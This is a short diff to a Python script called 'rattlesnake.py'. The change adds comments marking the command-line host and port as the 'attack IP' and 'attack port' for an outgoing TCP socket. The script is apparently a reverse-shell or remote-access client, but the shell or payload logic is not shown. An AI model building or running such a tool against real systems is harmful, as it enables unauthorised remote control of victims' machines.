@@ -6,8 +6,8 @@ import os
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 try:
-    host = sys.argv[1]
-    port = int(sys.argv[2])
+    host = sys.argv[1] # attack IP
+    port = int(sys.argv[2]) # attack port
 except IndexError:
     print("Usage: ./rattlesnake.py [host] [port]")
 HEADER = 64
